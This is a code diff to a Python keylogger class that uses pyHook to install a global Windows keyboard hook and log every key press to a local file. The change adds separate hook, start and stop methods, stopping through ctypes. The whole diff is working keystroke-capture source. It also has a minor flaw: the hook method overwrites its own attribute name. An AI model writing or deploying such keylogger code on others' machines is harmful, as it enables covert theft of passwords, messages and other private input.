@@ -2,6 +2,7 @@ from pyHook import HookManager, GetKeyState, HookConstants
 from pythoncom import PumpMessages
 from sys import stdout
 from logging import getLogger, FileHandler, Formatter, DEBUG
+from ctypes import windll
 import string
 
 import pdb
@@ -11,6 +12,7 @@ import pdb
 class KeyLogger(object):
 
     def __init__(self, logging=True):
+        self.hooked = False
         if logging:
             log_file = "log.txt"
             self.logger = getLogger("keys")
@@ -63,14 +65,25 @@ class KeyLogger(object):
         """
         self.logger.info(str(key))
 
-    def start_capture(self):
-        """ Hook keyboard and pull key presses
+    def hook(self):
+        """ Hook Keyboard
 
         """
-        hook = HookManager()
-        hook.KeyDown = self.key_log
-        hook.HookKeyboard()
+        self.hook = HookManager()
+        self.hook.KeyDown = self.key_log
+        self.hook.HookKeyboard()
+
+
+    def start_capture(self):
+        """ Pull key presses
+
+        """
+        self.hook()
         PumpMessages()
+
+    def stop_capture(self):
+        windll.user32.PostQuitMessage(0)
+        self.hook.UnhookKeyboard()
 
 
 if __name__ == "__main__":
